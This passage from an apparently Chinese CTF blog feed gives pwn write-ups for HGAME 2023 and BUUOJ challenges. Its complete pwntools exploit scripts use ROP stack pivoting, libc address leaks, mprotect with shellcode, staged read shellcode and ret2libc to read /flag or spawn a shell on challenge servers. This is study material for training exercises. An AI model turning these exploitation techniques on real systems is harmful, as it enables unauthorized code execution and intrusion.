class="line">puts_addr = u64(io.recvline().split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>] + base_addr</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>] + base_addr</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>] + base_addr</span><br><span class="line">pop_rsi_ret = <span class="number">0x02601f</span> + base_addr</span><br><span class="line">pop_rdx_ret = <span class="number">0x142c92</span> + base_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>) <span class="comment">#这里就是新rbp-0x100的地方，也就是刚写&#x27;/flag\x00\x00\x00&#x27;的地址</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x3</span>) </span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)   <span class="comment"># 指定缓冲区地址,随意</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)</span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>最后结果：</p><p><img data-src="/./../images/image-20230115214426688.png" alt="image-20230115214426688"></p><p>这里还有一种做法，原本程序开启了NX保护，我们可以通过libc中的mprotect函数给一段内存区域更改权限，然后在栈中写入shellcode，然后让程序执行栈中的shellcode，这里shellcode也很长，也需要用到栈迁移</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p64(<span class="number">0</span>)   <span class="comment">#0x404160</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404000</span>) <span class="comment">#这里是mprotect函数要操作的开始地址   #0x404170</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1000</span>)          <span class="comment"># 要操作的大小 #0x404180</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">7</span>)  <span class="comment"># 7代表可读可写可执行权限   #0x404190</span></span><br><span class="line">payload2 += p64(mprotect_addr)</span><br><span class="line">payload2 += p64(<span class="number">0x4041a8</span>)       <span class="comment">#0x4041a0</span></span><br><span class="line">payload2 += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="number">1</span>))   </span><br><span class="line">payload2 += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line">payload2 += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br></pre></td></tr></table></figure><p>mprotect参数有三，起始地址，长度，权限</p><p>这里程序出了bug，flag中g实在写不进去不知道为啥(更新，没设置64位，加上context.arch &#x3D; “amd64”这句就行，因为系统默认32位，&#x2F;flag的字符串正好超出4字节数据)</p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31266</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal =  [&quot;konsole&quot;, &quot;-e&quot;]</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">libc_puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x4012be</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0401393</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;task.\n&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">mprotect_addr = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>] + base_addr</span><br><span class="line">pop_rsi_ret = <span class="number">0x02601f</span> + base_addr</span><br><span class="line">pop_rdx_ret = <span class="number">0x142c92</span> + base_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)   <span class="comment">#0x404160</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404000</span>) <span class="comment">#这里是mprotect函数要操作的开始地址   #0x404170</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1000</span>)          <span class="comment"># 要操作的大小 #0x404180</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">7</span>)  <span class="comment"># 7代表可读可写可执行权限   #0x404190</span></span><br><span class="line">payload2 += p64(mprotect_addr)</span><br><span class="line">payload2 += p64(<span class="number">0x4041a8</span>)       <span class="comment">#0x4041a0</span></span><br><span class="line">payload2 += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="number">1</span>))   </span><br><span class="line">payload2 += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line">payload2 += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p>题目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x10</span>uLL);</span><br><span class="line">  sandbox();</span><br><span class="line">  MEMORY[<span class="number">0xCAFE0000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目用mmap映射出一段以0xCAFE0000开始，长度为0x1000，权限是7（可读可写可执行）</p><p>用sandbox设置了系统权限</p><p>这里向0xCAFE0000读入16字节，可以考虑rop，但检查保护时，就放弃了</p><p><img data-src="/./../images/image-20230116111016050.png" alt="image-20230116111016050"></p><p>写入shellcode,用orw的话，长度也远远不够</p><p>HINTS:</p><p>一次read不够多，为什么不再读一次呢？</p><p>第一次将read的shellcode读入，然后再程序执行0xCAFE0000这段内存，从而执行读入的read，那就要好好设计一波read的shellcode了，起初我是用rdi这种64位的寄存器写的，但是最终长度远远超过16字节</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rsi,0xCAFE0010</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rdx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230116111442132.png" alt="image-20230116111442132"></p><p>然后只能全部改成edi这种32位寄存器的形式了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax,0</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">mov edi,0</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>但是还是不行</p><p><img data-src="/./../images/image-20230116111621791.png" alt="image-20230116111621791"></p><p>把mov 0的操作全部换成xor，就对了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230116112543060.png" alt="image-20230116112543060"></p><p>这里要调用read，就要涉及系统调用号：</p><p>在汇编程序中使用Linux系统调用。 您需要采取以下步骤在程序中使用Linux系统调用 </p><ul><li>将系统调用号放在EAX寄存器中。</li><li>结果通常在EAX寄存器中返回</li></ul><p>&#x3D;&#x3D;这里注意64位和32的系统调用号是不一样的&#x3D;&#x3D;</p><ul><li>32位：<ul><li>传参方式：首先将系统调用号 传入 eax，sysread 的调用号 为 3 syswrite 的调用号 为 4</li></ul><p></p></li><li>64位：<ul><li>传参方式：首先将系统调用号 传入 rax，sysread 的调用号 为 0 syswrite 的调用号 为 1</li></ul></li></ul><p>所以这里的read系统调用号是0</p><p>这里写入read的shellcode后，执行我们写的shellcode，第二次写入的orw也是shellcode，这里要设置amd64位不然就无了。</p><p>这里有个细节在执行syscall指令时，程序会按照普通程序一样，会将shellcode的下一条指令压栈，所以在执行完syscall后，下一个指令要执行的地方就是syscall后的地址，这里除syscall这一条指令，长度为14，所以第二次写入的地址，只能是0xCAFE0000+14之后的地址，这里我们选择为0xCAFE0010就够了，然后直接写入orw的shellcode。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br></pre></td></tr></table></figure><p>这里的缓冲区我原先是写0xcafe1000的，结果后面才发现它总共才申请了0x1000的大小内存，哈哈</p><p>完整代码:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30105</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov esi,0xCAFE0010</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len:&#x27;</span>,<span class="built_in">len</span>(shellcode))</span><br><span class="line">io.sendafter(<span class="string">&#x27;shellcode:\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;\x90&#x27; * 0x10</span></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0500</span>,<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>结果：</p><p><img data-src="/./../images/image-20230116113635529.png" alt="image-20230116113635529"></p><hr><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>题中 __attribute__属性修饰函数，参考链接：<a href="https://blog.csdn.net/xiao__1bai/article/details/124156235">(61条消息) 浅析逆向中 gcc 在主函数前后运行的函数_沐一 · 林的博客-CSDN博客_逆向 init</a></p><p>该题考查base64，换表函数定义了__ attribute__ ((constructor))会使函数在 main() 函数之前被执行</p><p>这里ptrace检测反调试，即出现反调试就不进行换表操作<img data-src="/./../images/image-20230214103452756.png" alt="image-20230214103452756"></p><p>自己手动换表后用cyberchef解base64即可</p><hr><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="re-1"><a href="#re-1" class="headerlink" title="re"></a>re</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;复现hgame&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn_practice1</title>
    <link href="https://pa1r0t.github.io/2023/01/13/pwn-practice1/"/>
    <id>https://pa1r0t.github.io/2023/01/13/pwn-practice1/</id>
    <published>2023-01-13T03:50:36.000Z</published>
    <updated>2023-01-13T12:33:23.186Z</updated>
    
    <content type="html"><![CDATA[<p>pwn</p><span id="more"></span><h2 id="hgame2018-flag-server"><a href="#hgame2018-flag-server" class="headerlink" title="hgame2018_flag_server"></a>hgame2018_flag_server</h2><h3 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -v <span class="string">&quot;<span class="subst">$(pwd)</span>:/ctf/work&quot;</span> -i -t skysider/pwndocker /bin/bash</span></span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230113115308826.png" alt="image-20230113115308826"></p><h3 id="程序核心逻辑"><a href="#程序核心逻辑" class="headerlink" title="程序核心逻辑"></a>程序核心逻辑</h3><p>这里有个随机值，输入的值和随机值比较</p><p><img data-src="/./../images/image-20230113115524208.png" alt="image-20230113115524208"></p><p>我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span>  <span class="type">int</span> v3 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v3);</span><br><span class="line"><span class="built_in">srand</span>(v3);</span><br><span class="line"><span class="type">int</span> v8 = <span class="built_in">rand</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,v8);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>giao~~~~~</p><p>然后我只能老老实实找漏洞了</p><p>先是发现可以读取字符串name<img data-src="/./../images/image-20230113115909861.png" alt="image-20230113115909861"></p><p>找到读取字符串的函数是自己编的<img data-src="/./../images/image-20230113115811014.png" alt="image-20230113115811014"></p><p>最后v10进行检验<img data-src="/./../images/image-20230113115933550.png" alt="image-20230113115933550"></p><p>这里看栈分布<img data-src="/./../images/image-20230113120005292.png" alt="image-20230113120005292"></p><p>直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int))</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28388</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./flag_server&#x27;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;your username length: &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x44</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img data-src="/./../images/image-20230113120243209.png" alt="image-20230113120243209"></p><hr><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="核心程序"><a href="#核心程序" class="headerlink" title="核心程序"></a>核心程序</h3><p><img data-src="/./../images/image-20230113201822956.png" alt="image-20230113201822956"></p><p><strong>利用点</strong>：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可</p><p>这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用</p><h3 id="寻找rop"><a href="#寻找rop" class="headerlink" title="寻找rop"></a>寻找rop</h3><p>目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p>结果：</p><p><img data-src="/./../images/image-20230113202715207.png" alt="image-20230113202715207"></p><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26320</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">encrypt_addr = elf.sym[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment"># 用于打印puts的地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment"># puts函数地址</span></span><br><span class="line">rdi_ret = <span class="number">0x400c83</span></span><br><span class="line"><span class="comment"># puts函数的参数puts函数的地址puts函数执行完的返回地址，用于下一次的shellcode</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 拿到puts在内存中的地址</span></span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找内存libc的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">addr_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 